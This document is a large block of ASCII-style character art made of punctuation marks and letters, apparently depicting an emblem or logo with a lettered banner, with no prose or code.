::::::::::::::::::::::::::::::::::::::::::::::::..:::.:[email protected]@[email protected]@B:.......:::::::::::::::::[email protected]@B7..:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^:::::::::::::::::::::^^^^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^[email protected]@5~...::::::::::::::::::::::::::....:[email protected]@[email protected]@Y..:..:......:...::::.............:.::::........:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::...::...!&@&P5555555P55555555555555555P5P#@@J...:..:::::::::::::::::::[email protected]@#Y^..:^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^..^[email protected]&5~...:::::::::::::::::::::::::::...:[email protected]@#P555555555555555555555555555P5P&@&~.::.:..::.:.....5##G:..............Y##G^.......:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::[email protected]@B5555555555555555555555555555P&@&!.:...::::::::::.:::::::......~5&@@GJ^...^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^:..:?G&@@@#?^....:::::::::::::::::::::::::::...~#@&[email protected]@5.:.::...::..?BGGG&@@&GGGGGGGGGGGGGGG#@@@BGGGB!...::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::......:.:.~&@&P5555555555555555555555555555G&@B^..:.::::::::::..:.....:....^?P&@@@@@#Y!:  .:^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^:[email protected]@@@@@@@@&5!:....::..:::::::::::::::::::.:.^[email protected]&G55P5555555555555555555555555P5P&@&~....:..::[email protected]@#[email protected]@&5JYYY~..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@[email protected]@G:.::.:::::::..:......:..:7P&@@@@@#GG#@@&BY7^. ..:^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^:.. .:!JG&@@#[email protected]@@@@@@@@G?^......::::::::::::::::::...:[email protected]@[email protected]@5...::.:::::::[email protected]@#[email protected]@#^ ......:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.~#@&P5P55555555555555555555555555P#@@Y...:::::::::.........^Y#@@@@&BPJ7777J5G#@@@#GY7~:.  .::^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^::.  .:^!JP#&@&&BY?7777JP&@@@@@@@@#5~....::::.::::::::::.:.:[email protected]@#P55P5555555555555555555555555P5P&@#^...::::::::::[email protected]@&BBBBBBBBBBBBBBB#@@#^..:....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::.:.:[email protected]@#P555555555555555555555555P5PPP#@@J..:::::::::..:....~5&@@@@#PJ7777777?JYPBB#&&@@@&BPY?!^:.  ...::^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^::...   .:~7JPB#@@@@##BBGGG5?77777?5#@@@@@@@@&P!...::.:::::::::::.:...?&@#P5P5555555555555555555555555555P#@@?..:.::::::::::[email protected]@#[email protected]@#^..::...:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@G5555P55555555555555555555PPP5P#@@Y..:..::.:::.:..~5&@@@@[email protected]@@@@@@@@&#G5Y?!~::.    ...::::^^^^^^~~~~~~~~~~~~~~~~~~~~~^^^^^^::::...     .:^~7?YPB#&@@@@@@@@@@BGBBBBBBBPJ777777YG&@@@@@@@&G7...:::::.:...:::[email protected]@#P5P55555555555555555555555555555G&@G:.:::::::::.::[email protected]@&BB##########BBB&@@#^.......:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..~#@&G5PP55555555555555555555555PP5P#@@5:.::.....:..^Y&@@@@GJ7777777J5PPPPPGBBBBBB&@@@@&#@@@@@&@@@@@&&#BG5Y?7!~^^::....                       ....::^^~!7?JYPG#&&@@@@@&&&@@@@@&&@@@@@BBBBBBBBBBPY?77777JG&@@@@@@@@G!...:[email protected]@#P5P5555555555555555555555555P5P5G&@#~.::::::::::[email protected]@#[email protected]@#?!!!!!^.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#P5P555555555555555555555555555P#@@5:........:?#@@@@BJ777777?J5PPPPPPPGBBBBB&@@@@&J7Y#@@@&#BBB###&&B#&@@@@@@&&##BBGGGPPP55555555555PPPGGBBB##&&&@@@@@@@&GYJP##BBBB#&@@@&#BB&@@@@&BBBBBBBBBBBGY?77777?P&@@@@@@@@G!..:.......:[email protected]@#P5P555555555555555555555555555P5P#@&?..::::::::.::[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@?..::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#P555555555555555555555555555P5P#@@P^..:[email protected]@@@#Y777777?YPPPPPPPPPPGBBBG#@@@@@Y7777P&@@@&BGBBBBGJ:[email protected]@@@&BBB###&&&&&&&&&&&&&&&&&&&&&####BBBB#@@@@#?. .JGBBBBB&@@@@#BGBBB&@@@@#BBBBBBBBBBBBGY?77777?5&@@@@@@@@P!..:..:...:[email protected]@#P555555555555555555555555555555PP#@@Y..:::::::::::...^!!!~~75&@@&57~7JJJ7!!J#@@@BJ7~~!!!^.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::..:[email protected]@B55555555555555555555555555P555PB&@B!....?&@@@@[email protected]@@@@G777777P&@@@@#BBBBBBG7. [email protected]@@&#GPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPG&@@@&J. .7GBBBBB#@@@@&[email protected]@@@@BGBBBBBBBBBBBBGY?77777?5&@@@@@@@&P~..:.:[email protected]&[email protected]@P:...:::::::::::.....:75#@@#5!^::?&&@J:::^?B&@@BY!:. ..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:...^[email protected]&B5555555555555555555555P555P5P55G&@&J.:[email protected]@@@&Y777777?5PPPPPPPPPPPPPGBBB&@@@@#?77777JPPB&@@@@#BBBBBBP!  [email protected]@@@#GPPPPPPPPPPPPPPPPPPPPPPPPPPG&@@@&Y: .7PBBBBB#@@@@&BBBBBBBBBB#@@@@&BBBBBBBBBBBBBBGPY?77777?5&@@@@@@@&Y^...?&@&G555555555555555555555555555555555B&@G:...:.:::::::..:::~?P&@@#[email protected]@&&@@&@@@@@@@&&&&&[email protected]@@#GY7~.::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:::[email protected]&G5P555P5555555555555555555555555P#@@[email protected]@@@B?777777YPPPPPPPPPPPPPPGBBG#@@@@@Y77777?PPPPPB&@@@@#BBBBBBP!  [email protected]@@@#GPPPPPPPPPPPPPPPPPPPPPPB&@@@&5^  !PBBBBB#&@@@&#[email protected]@@@@#GBBBBBBBBBBBBGPPPY?77777?P&@@@@@@@#?^[email protected]@#P5PP5555555555555555555555555P5P55G&@B~...:..:::::::::.:5&@&GY!::[email protected]@@PJJJJJJ?:.~JP#@@#7.::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....:.~#@&G5PP55555555555555555555555555P5PB&@@@@@B?77777?5PPPPPPPPPPPPPPGBBBB&@@@@G777777YPPPPPPPB&@@@&#BBBBBBP!  [email protected]@@@#GPPPPPPPPPPPPPPPPPPB&@@@&5^  ~5BBBBB#&@@@@#BGBBBBBBBBBBBG#@@@@@[email protected]@@@@@@&#@&BP555555555555555555555555555555PP5G&@B~.......:::::::.:..:7!!^^^^^^^^^^^:J&@@J:^^^^^^^^^^^~!7^.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........~#@&G55555555555555555555555555555P55G#@@@G777777JPPPPPPPPPPPPPPGBBBBG#@@@@&J77777?PPPPPPPPPPB&@@@&#BBBBBBP7. ~P&@@@&BPPPPPPPPPPPPPPB&@@@&Y^  ~5BBBBBB&@@@@#BGBBBBBBBBBBBBBBB&@@@@&BBBBBBBBBBBBBGPPPPPPJ777777Y#@@@@@@@#G5P555555555555555555555555555555P5G&@B~.:.....:::::::::.:...:[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@&7..::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]&B555555555555555555555555555P55P5PB&@[email protected]@@@@P777777YPPPPPPPPPPPPB&@@@@#BBBBBBP7. ^Y&@@@&BGPPPPPPPPGB&@@@#Y:  ~5BBBBBB&@@@@#BGBBBBBBBBBBBBBBBBG#@@@@@BBBBBBBBBBBBBBPPPPPPP5?7777775&@@@&BP555555P555555555555555555555555555B&@B~..::....:::::::::.....:7??????????????????????????????^...:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....:..:.^[email protected]&B55P555555555555555555555555P555P5P#&BJ77JPPPPPPPPPPPGGBBBBBBBB#@@@@&J77777?PPPPPPPPPPPPPPPB&@@@@#BBBBBBG?: [email protected]@@@#GPPPPG#&@@@#J:  ~5BBBBBB&@@@@#[email protected]@@@@&[email protected]#P55P55555555555555555555555555555P55B&@G^.::.......::::::::.........................................:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::::.:.:.^[email protected]@BP5P555555555555555555555555555PP55G&&YJPPPPPPPPGGGBBBBBBBBBBB&@@@@B777777YPPPPPPPPPPPPPPPPPB&@@@@&BBBBBBGY^  [email protected]@@@&BB#@@@@B7. .!5BBBBB#&@@@@#GPPPPGBBBBBBBBBBBBBBBBBB#@@@@@BBBBBB[email protected]@P^.:.:..:..:::::::::::::::..::.:...::::::::::::::::::::::::.:::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.:[email protected]@#P5555555555555555555555555555PPPP5PG##GGGGGGGBBBBBBBBBBBBBG#@@@@@Y77777?PPPPPPPPPPPPPPPPPPPPB&@@@@&#BBBBBB5!  ^Y&@@@@@@@P!  .7PBBBBB#&@@@@#[email protected]@@@@#BBBBBBBBBBBBBGPPPPPPPPPPJ7JPGP55555555555555555555555555555555555P#@@5:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:..?&@&G5555555555555555555555555555555555PB###BBBBBBBBBBBBBBBBBG&@@@@#?77777JPPPPPPPPPPPPPPPPPPPPPPG#@@@@&#BBBBBBP7: [email protected]@#Y^  :?PBBBBB#&@@@&#GPPPPPPPPGBBBBBBBBBBBBBBBBBBB&@@@@&BBBBBBBBBBBBBBGPPPPPPPPPGPGP55P555555555555555555555555555555555G&@&?...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:..!#@&B55555555555555555555555555555555P55PG#&&BBGBBBBBBBBBBBBB&@@@@G7777775PPPPPPPPPPPPPPPPPPPPPPPPG#&@@@@#BBBBBBGJ^  ^~.  ^JGBBBBB#&@@@&BGPPPPPPPPPPGBBBBBBBBBBBBBBBBBBG#@@@@@BGBBBBBBBBBBBBBGPPPPPPGBGP5P5555555555555555555555555555555555PB&@B!.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......^[email protected]@#P55P55555555555555555555555555555555PG#&&##[email protected]@@@@57777775PPPPPPPPPPPPPPPPPPPPPPPPPPGB&@@@@&#BBBBBB5!. .!5BBBBBB&@@@@&[email protected]@@@@@#BBBBBBBBBBBBBBGGPGBBGP5555555555555555555555555555555555555P#@@P^.:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........?&@&G55P5555555555555555555555555555555P5PG#&@@&#BGBBBBBG#@@@@&?77777?PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPG#@@@@@#BBBBBBG5PBBBBB#&@@@@&BPPPPPPPPPPPPPPPGBBBBBBBBBBBBBBBBBBBB&@@@@@@&BBBBBBBBBBBBBBBBBGP55555555555555555555555555555555555P55G&@&?..:....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#P55555555555555555555555555555P555P555PB#@@&#BGBBBG&@@@@B777777YPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPG#@@@@&&BBBBBBBBBBBBBB#&@@@@@#GPPPPPPPPPPPPPPBBBBBBBBBBBBBBBBBBBBB&@@@@@@@@&BBBBBBBBBB##BP55P555555555555555555555555555555555PP5P#@@G~..:.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:.:J&@&GP55P5555555555555555555555555P55555P55PG#&@&#[email protected]@@@@G777777YPPPPPPPPPPPPPPPPPPPPPPPPPPPG#&@@@&P7:^JBBBBBBBBBBBBBP^^[email protected]@@@&#GPPPPPPPPPPGBBBBBBBBBBBBBBBBBBBBG#@@@@@@@@@@&BGBBBB#BGP55555555555555555555555555555555555P5P55G&@#J:...:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:[email protected]@#G555555555555555555555555555555555P5P555PG#&@&@@@@@@@5777777YPPPPPPPPPPPPPPPPPPPPPPPPG#&@@@@G?:  .~YBBBBBBBBBBBBBG?^  ^[email protected]@@@&#[email protected]@@@@@&@@@@@&&&#GPP5555555555555555555555555555555555555555G#@@P~....:.......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:...:[email protected]@BP5555555555555555555555555555555555555555PG#&@@@@@@Y777777YPPPPPPPPPPPPPPPPPPPPPGB&@@@@BY^   ^JPBBBBB#&@@@&#BBBBBB57:  ~Y#@@@@&[email protected]@@@@@[email protected]@@&#[email protected]@B7...:.:...:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::...:J&@&BP55555555555555555555555555555555555555555PG#&@@@J777777YPPPPPPPPPPPPPPPPPPG#&@@@@#Y~.  :75BBBBBB#&@@@@@@@&#BBBBBBGY!.  ~5#@@@@&#BBGBBBBBBBBBBBBBBBBBBBBBB&@@@@@&&&#GP5555555555555555555555555555555555555P55555PB&@&J:...:.:.:::::..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:..~5&@&GP5PP555555555555555555555555555555555555555PGB#BGY?777JPPPPPPPPPPPPPPPG#&@@@@#5!.  :!5GBBBBB#&@@@@&BB#&@@@@&#BBBBBBGY~. .!5#@@@@&#BBGBBBBBBBBBBBBBBBBBGB&@@@&#BGP555555555555555555555555555555555555555555P5PG&@&5~...:.:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@&GP5555P555555555555555555555555555555555555555PBBBPY??PPPPPPPPPPPPG#&@@@@#Y!.  .!YGBBBBB#&@@@@&#GPPPPPG#&@@@@&#BBBBBBPJ~  .!5#@@@@&#BBGBBBBBBBBBBBBBB#&&#BGP5555555555555555555555555555555555555555555PP5PG#@@P~..:...:..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....:[email protected]@&GP55P55555555555555555555555555555555555P555555PPGG5GGPPPPPPGB#&@@@@BY~.  .!YGBBBBB#&@@@@@#BGPPPPPPPPPPB#@@@@@&#BBBBBBPJ~  .!5#@@@@&#BBGGBBBBB##&&#BGPP55555555555555555555555555555555555555555555PPPPG&@@P!...:...:..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:.:.::[email protected]@&BP55555P55555555555555555555555555555555555555555PPPGGBBB#&@&##GJ^   .!YGBBBBB#&@@@@@&BGPPPPPPPPPPPPPPPGB#@@@@@&#BBBBBBPJ~  .~YB&@@@&&##&&&&#BGP55555555555555555555555555555555555555555P55555555PG&@&P!...:........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:..!P&@&BP55555P55555555555555555555555555555555555555555P55PPGGBBBG5J!!^~JGBBBBB#&@@@@@&BGPPPPPPPPPPPPPPPPPPPPPGB&@@@@@&#BBBBBBPJ~..~Y&@&&&#BGGPP55555P555555555555555555555555555555555555555555PP55PB&@&P!...::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.:..~Y&@&#G55555PP55555555555555555555555555555555555555555555555PPGBB#B##BBB##&&&&&&BGPPPPPPPPPPPPPPPPPPPPPPPPPPPGB&@@@@@&#BB###&BB#BBGGPP555555555555555555555555555555555555555555555555555P555PG#&@#Y~....:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.........^[email protected]@#GP555P55555555555555555555555555555555555555555555555555555PPPPGGBBBBB#############BBBBBBBBGGGGGGGGBBBBBB#&&&&&#BBBGGPPPP5555555555555555555555555555555555555555555555555555555P555PG#@@BJ^.........::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:....:7P&@&BGP5555P5555555555555555555555555555555555555555555555P555555555555PPPPGGGGBBB###################BBBBGGGPPPPPP5555555555P55P555555555555555555555555555555555555555555555555555PGB&@&P7:..::......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:...:::.....^[email protected]@#BP55P55555555555555P555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P55PB#@@BJ^...:...:::..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:...:!5#@@#GP555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PG#@@#5!:.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:....^?P&@&#GP5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PP555555PG#&@&P7^........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::::::.......:....^?P&@&#BP555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PB#&@&P?^...:..:.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....::.::...............::.::.....^?P#@@&BGP5555PP5555P55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P55555555555555555555PGB&@@#P?^.......:......::::::::::::::::::::::........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......::...:^^~~~~~~~~^::....:........:75B&@&#GPP555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P5555555P555555PP555PPPPPPPPPPPPPPG#&@@BY7^............................................:..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........:?P#&&@@@@@@@&&#GJ~............  .~?P#&&#BGPP5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PG#&&&@@@@@@@@&&&@&P?~................................................::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:..:[email protected]@@&#########&@@@&GPGGGGGGGP5YJYPPPPB&@@@@&&BGPP55555555PGBB########################BBGGB##########BGPPPGB###BBGPPPGB##########BBBB##############BBBB##########&@@@&#########&@@@&PPPPGGGGGPP5J77J5PGGGGGGGGPYJ~^7J5PGGGGGGGP5J7^...:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:[email protected]@@@G^^^^^^^^~~^[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&#BGPP5G#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&@@@@@@@@&#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G^^^^^^^^^~^[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#@@@@@@@@@@@@@@@#5^.:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@&5?: [email protected]@@&PB&@@&#&@@&[email protected]&[email protected]@@@&5?77Y#@@@@@G?777777777JBGJ7777777777777?Y##J777777777?P5?: YPPPPPPP5..!7777777777777JG&@&Y777777777?5&@@@#[email protected]@@G:....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:..:[email protected]@@Y ~YYPPPPPPPPPYYJJJJJJJJJJJJ?.^!.7JJJJJJJ7.~&@@&~.^[email protected]@@&7.!JJJJJJJJJJJJJJJJJJJJJJJ?^:PY !JJJJJJJJ.:#@&5~:!J7:^[email protected]@@@^.JJJJJJJJ? ~^:?JJJJJJJJJJJJ! J? 7JJJJJJJJ.  [email protected] !JJJJJJJY^ [email protected]@&! 7JJJJJJJ7.~&@@&!.:..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.^&@@@! JPPPPPPPPPPPPPPPPPPPPPPPPG?.!.:5PPPPPPGJ [email protected]@@#^[email protected]@@Y 7GPPPPPPPPPPPPPPPPPPPPPPPGY ~! YPPPPPPPP.^#Y^:!5PPP5!.7#@B.^PPPPPPPP? ^.!PPPPPPPPPPPPG! Y~.YPPPPPPPY. .JPPPPPPPPPPPPPPPPPPPPPPPPPPGP::#J ?GPPPPPPP^.#@@#::5PPPPPPGJ [email protected]@@#~.:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@&^.5PPPPPPPPPPPPPPPPPPPPPPPPG7 ? ~GPPPPPPG7 [email protected]@@G....~&@@@! JPPPPPPPPPPPPPPPPPPPPPPPPP? !^:5PPPPPPPJ.:^:75GPPPPPPY^:GP !PPPPPPPP~.~ ?PPPPPPPPPPPPG~ 5:^5PPPPPPG?  :5PPPPPPPPPPPPPPPPPPPPPPPPPPP5:^#~.YPPPPPPPY.~&@@G ~GPPPPPPG7 [email protected]@@B..:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@B.^PPPPPPPPPPPPPPPPPPPPPPPPPP~.7 !GPPPPPPP^[email protected]@@[email protected]@@&:.5PPPPPPPPPPPPPPPPPPPPPPPPG! 7 ~PPPPPPPG7 :75PPPPPPPPPY^.PJ JGPPPPPPP^.~.JGPPPPPPPPPPP5::5 !GPPPPPPG7  ^PPPPPPPPPPPPPPPPPPPPPPPPPPPGY.!&.^PPPPPPPGJ [email protected]@@Y !GPPPPPPP~ [email protected]@@5.:..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@G::?JPPPPPPPPPJ?????????????7.~~ YPPPPPPP5:^&@@@7.:[email protected]@@B.^PPPPPPPP5J?????JJ5PPPPPPPP^ ? 7GPPPPPPP??5PPPPPPPGPY~:?B&~.YPPPPPPPY:^~.7??JYPPPPPPPGY.!J ?PPPPPPPP^:.:?JPPPPPPPPPJ??????J5PPPPPPPP7 YG ~PPPPPPPP7 [email protected]@@7 JPPPPPPP5::#@@@?......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@BJ.:PPPPPPPPJ ~???????JJJJ?JPB^.5PPPPPPPY [email protected]@@@[email protected]@@5 !PPPPPPPG!.7J?J?:.JGPPPPPP5:^! ?PPPPPPPPPPPPPPPPPPJ~:[email protected]@#::5PPPPPPG? ?#5JJ! ~PPPPPPPG? J!.YPPPPPPP5.~PJ.:PPPPPPPPJ ~????~ 7PPPPPPPG~ GJ 7PPPPPPPP:[email protected]@&^[email protected]@@@~......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.^[email protected]@@P7~.~PPPPPPPP!.^!!!!!!!7Y&@@B7~.~PPPPPPPP7.^[email protected]@@B:.:#@@@? JGPPPPPPP^.#@@@@::5PPPPPPGJ !:.5PPPPPPPPPPPPPPPPJ~..^7Y#@G ~GPPPPPPG7 [email protected]@@@5 !GPPPPPPP~.5::PPPPPPPPY [email protected]~PPPPPPPP! ^!!!!^:JPPPPPPPP^.#! YPPPPPPPP.:&@@B.^PPPPPPPP7 [email protected]@@#:......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@&::Y55PPPPPPPP55YYYYYYYY^ [email protected]&^.Y55PPPPPPPP55J [email protected]@@&~.!&@@&~.YPPPPPPPY.~&@@@B.^PPPPPPPG? 7::PPPPPPPPPPPPPPPPP5Y55Y?:^#Y 7GPPPPPPP^[email protected]@@@7 JPPPPPPPP::5.^PPPPPPPP7 [email protected] ?GPPPPPPP~!YYYYYY5PPPPPPPGJ.!#^.5PPPPPPPJ [email protected]@@5 !PPPPPPPG~ [email protected]@@P:......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@P.~GPPPPPPPPPPPPPPPPPPPP^.#@B.:PPPPPPPPPPPPPJ [email protected]@@@[email protected]@@#.^PPPPPPPG? [email protected]@@@Y !PPPPPPPP~.7.~PPPPPPPPPPPPPPPPPPPPPPG! 57 JGPPPPPP5::#@@@&~.YPPPPPPP5.~Y [email protected]!.YPPPPPPP5^JGPPPPPPPPPPPPPY:.BB ~PPPPPPPG7 [email protected]@@J ?PPPPPPPP^.#@@@J......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@Y [email protected]@P ~PPPPPPPPPPPPP! [email protected]@@@@@@@@@G ~GPPPPPPP! [email protected]@@@7 JPPPPPPPP::7 JGPPPPPPPPPPPPPPPPPPPPPP~ P^.5PPPPPPPY [email protected]@@@#.:5PPPPPPG? ?7 JGPPPPPPP::&&::5PPPPPPPJ:YPPPPPPPPPPPPPP5:.B5 7GPPPPPPP! [email protected]@@~.JPPPPPPPY.^&@@&!......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
